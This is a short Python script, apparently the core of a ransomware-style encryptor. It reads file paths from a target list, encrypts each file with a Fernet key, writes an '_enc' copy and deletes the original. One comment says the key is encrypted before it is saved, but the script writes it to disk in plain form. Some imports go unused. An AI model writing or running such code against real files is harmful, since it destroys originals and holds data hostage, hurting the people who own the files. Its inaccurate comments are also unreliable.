import os
import random
import string
from cryptography.fernet import Fernet

# Generate a random symmetric key in memory
key = Fernet.generate_key()

# Write the encrypted key to disk
with open('smem-enc', 'wb') as f:
    f.write(key)

# Read the target list from a configuration file
with open('target_list.txt', 'r') as f:
    target_list = [line.strip() for line in f]

# Encrypt each file in the target list
for file_path in target_list:
    # Check if the file exists
    if os.path.isfile(file_path):
        # Generate a new encrypted file name
        file_dir, file_name = os.path.split(file_path)
        file_name, file_ext = os.path.splitext(file_name)
        encrypted_file_name = file_name + '_enc' + file_ext
        encrypted_file_path = os.path.join(file_dir, encrypted_file_name)
        
        # Read the contents of the original file
        with open(file_path, 'rb') as f:
            file_data = f.read()
        
        # Encrypt the file contents
        f = Fernet(key)
        encrypted_data = f.encrypt(file_data)
        
        # Write the encrypted contents to the new file
        with open(encrypted_file_path, 'wb') as f:
            f.write(encrypted_data)
        
        # Delete the original file
        os.remove(file_path)

# Clear the symmetric key from memory
key = None
